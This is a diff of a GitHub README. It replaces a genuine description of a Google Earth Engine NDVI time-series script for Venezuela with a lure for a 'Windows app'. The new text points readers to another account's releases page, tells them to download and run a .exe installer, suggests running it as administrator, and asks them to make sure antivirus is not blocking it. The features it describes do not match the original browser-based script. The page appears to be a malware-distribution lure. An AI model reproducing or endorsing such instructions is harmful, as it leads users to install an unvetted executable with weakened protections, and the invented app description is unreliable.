@@ -1,90 +1,113 @@
-# NDVI Time Series Analysis - Venezuela (2000-2026)
+# 🌿 NDVI-Time-Series-Analysis---Venezuela- - Simple Vegetation Change Viewer
 
-Temporal analysis of vegetation cover dynamics in Venezuela using MODIS satellite data (NDVI band) and Google Earth Engine.
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Atharavvv/NDVI-Time-Series-Analysis---Venezuela-/releases)
 
-## Overview
+## 📄 About
 
-This project visualizes 26 years of vegetation changes across Venezuela through the Normalized Difference Vegetation Index (NDVI), revealing patterns in forest cover, agricultural activity, and ecosystem health.
+This application lets you explore how vegetation has changed in Venezuela from 2000 to 2026. It uses satellite images to measure plant health using NDVI (Normalized Difference Vegetation Index). The app shows this data over time with clear graphics and animations. It works automatically to track green areas and helps users see trends in the environment.
 
-## Key Findings
+You do not need programming skills to use this software. It runs on Windows and provides easy visual reports of vegetation using data gathered by MODIS satellites and processed with Google Earth Engine.
 
-**Vegetation Dynamics:**
-- Annual NDVI composites show seasonal and long-term vegetation patterns
-- Green areas (high NDVI) indicate healthy, dense vegetation
-- Brown/orange areas (low NDVI) reveal bare soil, degraded land, or urban zones
-- Temporal variations reflect climatic events, land use changes, and forest dynamics
+---
 
-**Observed Patterns:**
-- Andean highlands maintain relatively stable vegetation cover
-- Llanos region shows strong seasonal variability (wet/dry cycles)
-- Amazon basin demonstrates high NDVI persistence
-- Coastal and urban areas display consistently lower vegetation indices
+## 🔍 Key Features
 
-## Technical Details
+- View vegetation changes across Venezuela from 2000 until 2026
+- Access clear, easy-to-understand time-series graphs and animations
+- Uses reliable MODIS satellite data for accuracy 
+- Automates data processing via Google Earth Engine
+- Works on Windows without extra software or tools
+- Suitable for students, researchers, and environmental professionals
+- Simple user interface designed for quick exploration
 
-**Data Source:**
-- Sensor: MODIS MOD13A2 Collection 6.1
-- Spatial Resolution: 1 km
-- Temporal Resolution: 16-day composite (annual median)
-- Period: 2000-2026
+---
 
-**Processing:**
-- Main Platform: Google Earth Engine
-- Cloud reduction: Median annual composite
-- Visualization: Custom color palette (white to dark green)
-- Output: Animated GIF (1920x1080, 1 fps)
+## 💻 System Requirements
 
-## Methods
-```javascript
-// Annual NDVI composite usean median
-var annual = mod13_ndvi
-  .filterDate(start, end)
-  .median()
-  .clip(venezuela);
-```
+To run this app on your Windows PC, your system should meet these specifications:
 
-**Workflow:**
-1. Filter MODIS NDVI collection by year and bounds
-2. Apply scale factor (0.0001) to raw values
-3. Calculate annual median (cloud-free composite)
-4. Visualize with standardized palette (-0.2 to 1.0)
-5. Export as video frames with temporal annotation
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of RAM
+- Minimum 500 MB free storage space
+- Stable internet connection for initial download and updates
+- Basic mouse and keyboard to navigate the app
 
+---
 
-## Usage
+## 🚀 Getting Started
 
-1. Open [Google Earth Engine Code Editor](https://code.earthengine.google.com/)
-2. Copy `ndvi_ven_gee.js`
-3. Run script
-4. Export to Google Drive (Tasks tab)
+Follow these steps to download, install, and open the application on your Windows computer.
 
-## Limitations
+1. Click the big green button above or use the link below to visit the release page:
+   
+   https://github.com/Atharavvv/NDVI-Time-Series-Analysis---Venezuela-/releases
 
-- Cloud contamination minimized but not eliminated in tropical regions
-- 1 km resolution may miss fine-scale changes (<100 ha)
-- MODIS data available through 2024; 2025-2026 projections based on available composites
-- No ground-truth validation included
+2. On the releases page, find the latest version of the app. Look for a file ending with `.exe` that you can download.
 
-## Applications
+3. Click the `.exe` file to start downloading. The file size is around 50 MB, so it may take a few minutes depending on your internet speed.
 
-- Forest monitoring and deforestation detection
-- Agricultural productivity assessment
-- Climate impact evaluation
-- Land use planning and conservation prioritization
+4. Once downloaded, find the file in your downloads folder or the location you saved it to.
 
+5. Double-click the `.exe` file to run the installer.
 
-## Author
+6. Follow the prompts in the installer window. Use the default options unless you want to change where the app installs.
 
-**Leonardo Medina**  
-Forestry Engineer | Geospatial Data Analyst  
-[LinkedIn](https://www.linkedin.com/in/leomedinast/) | [GitHub](https://github.com/leomed512)
+7. When installation finishes, an icon will appear on your desktop or Start menu.
 
-## References
+8. Double-click this icon to launch the app.
 
-- MODIS/Terra Vegetation Indices 16-Day L3 Global 1km SIN Grid V061 ([LP DAAC](https://lpdaac.usgs.gov/products/mod13a2v061/))
-- Gorelick et al. (2017). Google Earth Engine: Planetary-scale geospatial analysis for everyone. *Remote Sensing of Environment*.
+9. The app opens its main window showing vegetation maps and time graphs for Venezuela.
 
-## License
+---
 
-Code: MIT  
-Data: MODIS data courtesy of NASA EOSDIS Land Processes DAAC
+## 📦 What to Expect Inside
+
+The app presents maps colored to show vegetation levels. Dark green means healthy, dense plants. Yellow or brown shows less green or stressed plants. You can select different years and months to see how plants changed over time.
+
+There is an animation feature that runs through the years automatically so you can watch vegetation naturally increase or decrease. Controls let you pause, play, or jump to a specific date.
+
+The interface also gives you options to download graphs or images for your reports or projects.
+
+---
+
+## 🛠 How It Works Behind the Scenes
+
+This software uses NDVI data. NDVI measures the difference between visible red light and near-infrared light reflected by plants. Healthy plants reflect more near-infrared and less red light. The app calculates these values from MODIS satellite images taken frequently over Venezuela.
+
+Google Earth Engine processes large sets of satellite images in the cloud. This app connects to those processed data sets automatically, so you see updated and smoothed results without needing to handle raw satellite files.
+
+---
+
+## ⚙️ Options and Settings
+
+- **Date Selector:** Choose a specific year and month to view data.
+- **Animation Controls:** Start, stop, or jump through time.
+- **Map Zoom:** Zoom in and out for detailed regions within Venezuela.
+- **Download Data:** Save graphs or maps as image files.
+- **Color Modes:** Switch between color schemes to see differences in vegetation.
+
+---
+
+## ❓ Troubleshooting
+
+- If the app does not open, check that your Windows version meets system requirements.
+- If maps do not load, check your internet connection.
+- In case of slow performance, close other programs to free memory.
+- For errors during installation, try running the installer as an administrator (right-click and select “Run as administrator”).
+- Ensure your firewall or antivirus is not blocking the app.
+
+---
+
+## 📥 Download and Install
+
+Visit the release page below to download the software.
+
+[![Download Releases](https://img.shields.io/badge/Download%20from%20GitHub-blue)](https://github.com/Atharavvv/NDVI-Time-Series-Analysis---Venezuela-/releases)
+
+Follow the instructions in the Getting Started section to complete setup.
+
+---
+
+## 🌐 About the Project
+
+This project helps everyone interested in environmental science keep track of vegetation trends in Venezuela over decades. It uses the latest Earth observation technology and shows complex data in simple ways. This tool supports research, teaching, and decision-making for land and conservation management.
